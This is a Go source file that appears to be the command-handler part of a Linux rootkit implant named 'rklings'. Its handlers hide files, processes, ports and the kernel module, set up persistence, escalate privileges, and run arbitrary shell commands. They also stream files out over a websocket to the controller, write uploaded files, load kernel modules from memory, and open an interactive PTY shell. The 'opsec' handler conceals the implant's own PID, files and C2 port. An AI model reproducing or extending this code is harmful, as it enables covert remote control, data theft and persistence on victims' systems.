package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func handleStatusCmd() any {
	return map[string]int{"pid": os.Getpid(), "uid": os.Getuid()}
}

func handleHideCmd(arg string) any {
	if strings.TrimSpace(arg) == "MODULE" {
		if err := mkdirCmd("h.m"); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	}
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "ERR missing argument"
	}
	prefixes := map[string]string{"FILE": "h.f", "PID": "h.i", "PORT": "h.p", "CONTENT": "h.c"}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		return "ERR unknown hide target"
	}
	if err := mkdirCmd(prefix + "." + parts[1]); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleUnhideCmd(arg string) any {
	if strings.TrimSpace(arg) == "MODULE" {
		if err := mkdirCmd("u.m"); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	}
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "ERR missing argument"
	}
	prefixes := map[string]string{"FILE": "u.f", "PID": "u.i", "PORT": "u.p", "CONTENT": "u.c"}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		return "ERR unknown unhide target"
	}
	if err := mkdirCmd(prefix + "." + parts[1]); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleOpsecCmd() any {
	pid := os.Getpid()
	mkdirCmd("h.i." + strconv.Itoa(pid))
	mkdirCmd("h.f.rklings")
	mkdirCmd("h.c.rklings")
	_, port, _ := strings.Cut(serverAddr, ":")
	if port != "" {
		mkdirCmd("h.p." + port)
	}
	return "OK"
}

func handlePersistCmd() any {
	_ = mkdirCmd("u.c.rklings")
	err := installPersistence()
	_ = mkdirCmd("h.c.rklings")
	if err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleUnpersistCmd() any {
	_ = mkdirCmd("u.c.rklings")
	err := removePersistence()
	_ = mkdirCmd("h.c.rklings")
	if err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleEscalateCmd(arg string) any {
	name := "e"
	if arg != "" {
		name = "e." + arg
	}
	if err := mkdirCmd(name); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleShellCmd(arg string) any {
	out, err := exec.Command("/bin/sh", "-c", arg).CombinedOutput()
	exitCode := 0
	if err != nil {
		exitCode = -1
		if cmd, ok := err.(*exec.ExitError); ok {
			exitCode = cmd.ExitCode()
		}
	}
	return map[string]any{
		"stdout":    string(out),
		"exit_code": exitCode,
	}
}

const dlChunkSize = 1 << 20 // 1MB

func streamDownload(path string) error {
	f, err := os.Open(path)
	if err != nil {
		wsSend(map[string]any{"data": map[string]string{"error": err.Error()}})
		return nil
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		wsSend(map[string]any{"data": map[string]string{"error": err.Error()}})
		return nil
	}

	if err := wsSend(map[string]any{"data": map[string]any{"size": info.Size()}}); err != nil {
		return err
	}

	buf := make([]byte, 1+dlChunkSize)
	buf[0] = 0x01
	for {
		n, readErr := f.Read(buf[1:])
		if n > 0 {
			if err := wsSendRaw(buf[:1+n]); err != nil {
				return err
			}
		}
		if readErr != nil {
			break
		}
	}

	return wsSendRaw([]byte{0x02})
}

func handleUploadCmd(cmd Command) any {
	var req struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}
	if json.Unmarshal(cmd.Data, &req) != nil {
		return "ERR bad upload data"
	}
	raw, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return fmt.Sprintf("ERR decode: %v", err)
	}
	if err := os.WriteFile(req.Path, raw, 0644); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func handleLoadmodCmd(cmd Command) any {
	var req struct {
		Data string `json:"data"`
	}
	if json.Unmarshal(cmd.Data, &req) != nil {
		return "ERR bad loadmod data"
	}
	ko, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return fmt.Sprintf("ERR decode: %v", err)
	}
	if err := loadModuleFromMemory(ko); err != nil {
		return fmt.Sprintf("ERR insmod: %v", err)
	}
	return "OK"
}

func handlePTYCmd(arg string) any {
	parts := strings.SplitN(arg, " ", 2)
	switch parts[0] {
	case "START":
		return ptyStart()
	case "INPUT":
		if len(parts) != 2 {
			return "ERR no input"
		}
		return ptyInput(parts[1])
	case "RESIZE":
		if len(parts) != 2 {
			return "ERR no size"
		}
		return ptyResize(parts[1])
	case "CLOSE":
		return ptyClose()
	default:
		return "ERR invalid PTY operation"
	}
}

